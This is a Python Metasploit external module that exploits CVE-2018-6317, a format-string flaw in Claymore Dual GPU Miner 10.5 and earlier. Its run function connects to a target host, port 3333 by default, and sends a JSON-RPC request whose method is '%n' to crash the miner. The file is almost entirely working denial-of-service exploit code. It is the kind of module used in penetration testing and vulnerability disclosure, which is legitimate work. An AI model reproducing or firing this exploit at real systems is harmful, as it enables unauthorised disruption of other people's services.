#!/usr/bin/env python
# Note, works with both python 2.7 and 3


import socket
import json

from metasploit import module

metadata = {
    'name': 'Claymore Dual GPU Miner  Format String dos attack',

    'description': '''
    Claymore’s Dual GPU Miner 10.5 and below is vulnerable to a format strings vulnerability. This allows an 
    unauthenticated attacker to read memory addresses, or immediately terminate the mining process causing 
    a denial of service.
    ''',

    'authors': [
        'res1n',  # Vulnerability disclosure
        'bluebird',  # Metasploit external module (Python)
    ],

    'date': '2018-02-06',

    'references': [
        {'type': 'cve', 'ref': 'CVE-2018-6317'},
        {'type': 'url', 'ref': 'https://www.exploit-db.com/exploits/43972/'},
        {'type': 'url', 'ref': 'https://github.com/nanopool/Claymore-Dual-Miner'}
    ],

    'type': 'dos',
    'options': {
        'rhost': {'type': 'address', 'description': 'The target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'The target port', 'required': True, 'default': 3333},
    }}


def run(args):
    host = args['rhost']
    port = int(args['rport'])
    module.log("Creating sockets...", 'info')

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    exp = {
        'id': 1,
        'jsonrpc': '1.0',
        'method': '%n'
    }
    try:
        s.connect((host, port))
        s.send(json.dumps(exp))
        s.close()
    except socket.error:
        module.log("connect error exit")


if __name__ == "__main__":
    module.run(metadata, run)
